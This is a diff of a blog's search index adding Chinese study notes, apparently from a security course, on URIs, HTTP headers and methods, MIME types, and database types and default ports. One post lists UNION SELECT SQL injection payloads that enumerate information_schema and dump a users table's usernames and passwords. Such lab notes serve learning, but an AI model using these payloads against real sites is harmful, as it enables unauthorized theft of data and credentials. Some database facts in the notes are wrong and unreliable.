具体语法和URI的任何相关协议。方案不区分大小写，后跟 ： 。user:password：身份验证@：后跟主机名[:port]：端口号[? 查询]：可选，语法没有明确定义，通常由分割符的属性值对序列。使用 &amp; 连接参数[#锚]：可选，为辅助资源提供方向</code></pre><h1 id="URN"><a href="#URN" class="headerlink" title="URN"></a>URN</h1><p>URN是URI的一种，用特定命名空间的名字标识资源。使用URN可以在不知其网络位置及访问方式的情况下查找资源</p><h1 id="URL和URI的主要区别"><a href="#URL和URI的主要区别" class="headerlink" title="URL和URI的主要区别"></a>URL和URI的主要区别</h1><h2 id="1。作用区别"><a href="#1。作用区别" class="headerlink" title="1。作用区别"></a>1。作用区别</h2><p>URL主要用于连接网页，网页组件或网页上的程序，通过访问协议（http、ftp等）来检索位置资源<br>URI用于定义项目的标识</p><h2 id="2。URL是URI的子集"><a href="#2。URL是URI的子集" class="headerlink" title="2。URL是URI的子集"></a>2。URL是URI的子集</h2><h2 id="3。协议区别"><a href="#3。协议区别" class="headerlink" title="3。协议区别"></a>3。协议区别</h2><p>URL指定要使用的协议类<br>URI不涉及协议规范</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 第六周 </tag>
+            
+            <tag> HTTP协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HTTP与HTTPS的区别</title>
+      <link href="/2019/08/23/HTTP/"/>
+      <url>/2019/08/23/HTTP/</url>
+      
+        <content type="html"><![CDATA[<h1 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h1><p>HTTP（Hyper Text Transfer Protocol）：超文本传输协议<br>HTTPS：是一种通过计算机网络安全通信的传输协议，HTTPS是身披SSL外壳的HTTP。经由HTTP进行通信，利用SSL/TLS建立全信道，加密数据包。HTTPS主要是提供对网站服务器的身份认证，同时保护提数据的隐蔽与完整性。</p><h2 id="HTTP特点"><a href="#HTTP特点" class="headerlink" title="HTTP特点"></a>HTTP特点</h2><p>1。简单快速：只需传送方法和请求。<strong>常用请求方式：GET、HEAD、POST</strong><br>2。允许传输任意类型的数据对象。<strong>Content-Type</strong><br>3。无连接：每次连接只处理一个请求，服务器完成客户端的请求并接受客户端应答后断开。<br>4。无状态：HTTP协议是无状态的协议<br>5。支持B/S和C/S模式</p><h6 id="HTTPS是在HTTP的基础上加了一层SSL的加密协议对传输的信息进行加密。"><a href="#HTTPS是在HTTP的基础上加了一层SSL的加密协议对传输的信息进行加密。" class="headerlink" title="HTTPS是在HTTP的基础上加了一层SSL的加密协议对传输的信息进行加密。"></a>HTTPS是在HTTP的基础上加了一层SSL的加密协议对传输的信息进行加密。</h6><h2 id="HTTP协议常见头部信息"><a href="#HTTP协议常见头部信息" class="headerlink" title="HTTP协议常见头部信息"></a>HTTP协议常见头部信息</h2><p>Accept：浏览器可接受的MIME类型<br>Accept-Charest：浏览器可接受的字符集<br>Accept-Encoding：浏览器能够进行解码的数据编码方式<br>Accept-Language：浏览器所希望的语言种类<br>Authorization：授权信息<br>Connection：是否需要持久连接，Keep-Alive 持久连接。或者请求使用的是HTTP1.1（默认进行持久连接）当页面包含多个元素时（如：视频、音频等）<br>Content-Length：请求消息正文的长度<br>Cookie：电脑中的cookie从服务器相应头中，set-cookie来的<br>Host：初始URL中的主机和端口<br>If-Modified-Since：只有当所请求的内容在指定的日期之后又经过修改才返回<br>Pragma：指定“no-cache”值服务器必须返回一个刷新后的文档<br>Referer:验证请求来源<br>User-Agent：浏览器类型</p><h2 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h2><p>GET：检索URI中标识资源的一个简单请求<br>HEAD：与GET相同，只是服务器只返回状态行和头部，并不返回请求文档<br>POST：服务器接受被写入客户端流出的数据请求<br>PUT：向web服务器发送数据并存储在web服务器内<br>DELETE：从web服务器上删除一个文件<br>TRACE：跟踪服务器路径<br>OPTIONS：查询web服务器的信息</p><h2 id="MIMI文档格式"><a href="#MIMI文档格式" class="headerlink" title="MIMI文档格式"></a>MIMI文档格式</h2><p>通用类型：</p><table><thead><tr><th>类型</th><th>格式</th></tr></thead><tbody><tr><td>超文本标记语言文本</td><td>.html text/html</td></tr><tr><td>xml文档</td><td>.xml text/xml</td></tr><tr><td>XHTML文档</td><td>.xhtml application/xhtml+xml</td></tr><tr><td>普通文本</td><td>.txt text/plain</td></tr><tr><td>RTF文本</td><td>.rtf application/rtf</td></tr><tr><td>PDF文档</td><td>.pdf application/pdf</td></tr><tr><td>Microsoft</td><td>Word文件 .word application/msword</td></tr><tr><td>PNG图像</td><td>.png image/png</td></tr><tr><td>GIF图形</td><td>.gif image/gif</td></tr><tr><td>JPEG图形</td><td>.jpeg,.jpg image/jpeg</td></tr><tr><td>au声音文件</td><td>.au audio/basic</td></tr><tr><td>MIDI音乐文件</td><td>mid,.midi audio/midi,audio/x-midi</td></tr><tr><td>RealAudio音乐文件</td><td>.ra, .ram audio/x-pn-realaudio</td></tr><tr><td>MPEG文件</td><td>.mpg,.mpeg video/mpeg</td></tr><tr><td>AVI文件</td><td>.avi video/x-msvideo</td></tr><tr><td>GZIP文件</td><td>.gz application/x-gzip</td></tr><tr><td>TAR文件</td><td>.tar application/x-tar</td></tr><tr><td>任意的二进制数据</td><td>application/octet-stream</td></tr></tbody></table>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 第六周 </tag>
+            
+            <tag> HTTP协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>常见数据库</title>
+      <link href="/2019/08/22/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
+      <url>/2019/08/22/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
+      
+        <content type="html"><![CDATA[<h1 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h1><p>采用了关系模型来组织的数据库，其以行和列的形式存储数据，便于理解。一系列的行和列被称为表，一组表构成了数据库。关系型数据库可以简单的理解为二维表个模型，一个关系型数据库就是由二维表及其之间的关系组成的一个数据组织。</p><h4 id="代表：MySQL"><a href="#代表：MySQL" class="headerlink" title="代表：MySQL"></a>代表：MySQL</h4><h1 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h1><p>非关系型、分布式，强调键值对。是大量结构化数据存储方式的集合。</p><h4 id="代表：Access"><a href="#代表：Access" class="headerlink" title="代表：Access"></a>代表：Access</h4><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="1、面向检索的列存储式（Column-Oriented）"><a href="#1、面向检索的列存储式（Column-Oriented）" class="headerlink" title="1、面向检索的列存储式（Column-Oriented）"></a>1、面向检索的列存储式（Column-Oriented）</h3><p>其存储结构为列式结构，通于关心型数据库的行式结构。</p><h4 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h4><p>统计聚合操作方便，系统具有较高的可扩展性。适应海量数据的增加以及数据结构的变化，适合云计算。</p><h4 id="代表："><a href="#代表：" class="headerlink" title="代表："></a>代表：</h4><p>Big Table、HaBase</p><h3 id="2、面向高性能并发读-写的缓存存储（Key-Value）"><a href="#2、面向高性能并发读-写的缓存存储（Key-Value）" class="headerlink" title="2、面向高性能并发读/写的缓存存储（Key-Value）"></a>2、面向高性能并发读/写的缓存存储（Key-Value）</h3><p>结构类似于数据结构中的Hash表，每个Key分别对应一个Value</p><h4 id="特点：-1"><a href="#特点：-1" class="headerlink" title="特点："></a>特点：</h4><p>能够提供快速的查询速度、大数据存放量和高并发操作，非常适合通过主键对数据进行增删该查。</p><h4 id="代表：-1"><a href="#代表：-1" class="headerlink" title="代表："></a>代表：</h4><p>MemcacheDB、BerKeleyDB、Redis、Flare（Key—Value数据库的代表）</p><h3 id="3、面向海量数据访问的文档存储（Document-Oriented）"><a href="#3、面向海量数据访问的文档存储（Document-Oriented）" class="headerlink" title="3、面向海量数据访问的文档存储（Document-Oriented）"></a>3、面向海量数据访问的文档存储（Document-Oriented）</h3><p>和Key-Value非常类似，但这个Value主要以JSON或XML等各式的文档进行存储。</p><h4 id="特点：-2"><a href="#特点：-2" class="headerlink" title="特点："></a>特点：</h4><p>方便面箱对象的语言使用，可在海量数据中快速查询数据。</p><h4 id="代表：-2"><a href="#代表：-2" class="headerlink" title="代表："></a>代表：</h4><p>MongoDB、CouchDB等</p><h2 id="关系数据库和非关系数据库的区别"><a href="#关系数据库和非关系数据库的区别" class="headerlink" title="关系数据库和非关系数据库的区别"></a>关系数据库和非关系数据库的区别</h2><table><thead><tr><th>数据库类型</th><th>关系数据库</th><th>非关系数据库</th></tr></thead><tbody><tr><td>特点</td><td>1.使用关系组织数据库 <br>2.事务一致性<br> 3.二维表格模型</td><td>1.使用键值对存数据 <br>2.分布式<br>3.一般不支持ACID特性<br> 4.严格意义上不是数据库，而是一种数据结构化存储集合</td></tr><tr><td>优点</td><td>1.易理解<br>2.使用方便<br>3.易维护<br>4.支持SQL可复杂查询</td><td>1.无SQL层解析，读写性能高<br>2.基于键值对，数据没有耦合性，易于扩展<br>3.存储数据格式多样化</td></tr><tr><td>缺点</td><td>1.维护成本高<br>2.结构固定</td><td>1.不支持SQL<br>2.无事务处理</td></tr><tr><td># 常见数据库的信息</td><td></td><td></td></tr><tr><td>## MySQL</td><td></td><td></td></tr><tr><td>### 端口：3306</td><td></td><td></td></tr><tr><td>### 默认库information_schema和其中的表SCHEMATA（存储用户创建所有数据库的库名[SCHEMA_NAME]）、TABLES和COLUMNS</td><td></td><td></td></tr><tr><td>## SQLSever</td><td></td><td></td></tr><tr><td>### 端口：1433</td><td></td><td></td></tr><tr><td>## Oracle</td><td></td><td></td></tr><tr><td>### 端口：1521</td><td></td><td></td></tr><tr><td>## PostgreSQL</td><td></td><td></td></tr><tr><td>### 端口：5432或5433</td><td></td><td></td></tr><tr><td>## BD2</td><td></td><td></td></tr><tr><td>### 端口：5000</td><td></td><td></td></tr><tr><td>## SQLite</td><td></td><td></td></tr><tr><td>一种轻量级数据库，常用于移动端。</td><td></td><td></td></tr><tr><td>特点：一个库多个表，可用sqlite或sqlite2打开</td><td></td><td></td></tr><tr><td>## MongoDB</td><td></td><td></td></tr><tr><td>### 端口：27017</td><td></td><td></td></tr></tbody></table>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+          <category> 数据库 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
             <tag> 第五周 </tag>
+            
+            <tag> 数据库 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>UNION SELECT 命令 SQL注入</title>
+      <link href="/2019/08/14/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/"/>
+      <url>/2019/08/14/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="1、查看当前数据库信息"><a href="#1、查看当前数据库信息" class="headerlink" title="1、查看当前数据库信息"></a>1、查看当前数据库信息</h1><pre><code>and 2=1 union select  database(),version(),user(),4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123551167.png" alt></p><h1 id="2、通过tables表查询相关信息"><a href="#2、通过tables表查询相关信息" class="headerlink" title="2、通过tables表查询相关信息"></a>2、通过tables表查询相关信息</h1><pre><code>and 1=2 union select (select group_concat(table_name,&#39;~&#39;,table_schema,&#39;~&#39;,column_name) from information_schema.columns where table_schema=&#39;content&#39; or table_name=&#39;users&#39; ),2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123637831.png" alt></p><h1 id="3、根据查询信息查看单个表的详细信息"><a href="#3、根据查询信息查看单个表的详细信息" class="headerlink" title="3、根据查询信息查看单个表的详细信息"></a>3、根据查询信息查看单个表的详细信息</h1><h2 id="第一个表"><a href="#第一个表" class="headerlink" title="第一个表"></a>第一个表</h2><pre><code>and 1=2 union select (select group_concat(id,&#39;|&#39;,title,&#39;|&#39;,value,&#39;|&#39;,time,&#39;|&#39;,ip) from test.content),2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123734085.png" alt></p><h2 id="第二个表"><a href="#第二个表" class="headerlink" title="第二个表"></a>第二个表</h2><pre><code>and 1=2 union select (select group_concat(id,&#39;|&#39;,username,&#39;|&#39;,passwd,&#39;|&#39;,user_ip,&#39;|&#39;,join_date) from test.users),2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123814194.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+          <category> 数据库 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 第五周 </tag>
+            
+            <tag> 数据库 </tag>
             
             <tag> SQL注入 </tag>
             
@@ -41,6 +296,8 @@
       <categories>
           
           <category> i春秋 </category>
+          
+          <category> 数据库 </category>
           
       </categories>
       
@@ -474,9 +731,9 @@
       
         <tags>
             
-            <tag> 第三周 </tag>
-            
             <tag> 工具 </tag>
+            
+            <tag> 第三周 </tag>
             
         </tags>
       
@@ -503,9 +760,9 @@
       
         <tags>
             
-            <tag> 第三周 </tag>
-            
             <tag> 工具 </tag>
+            
+            <tag> 第三周 </tag>
             
         </tags>
       
@@ -719,11 +976,11 @@
       
         <tags>
             
-            <tag> 第三周 </tag>
-            
             <tag> 第二周 </tag>
             
             <tag> 工具 </tag>
+            
+            <tag> 第三周 </tag>
             
         </tags>
       
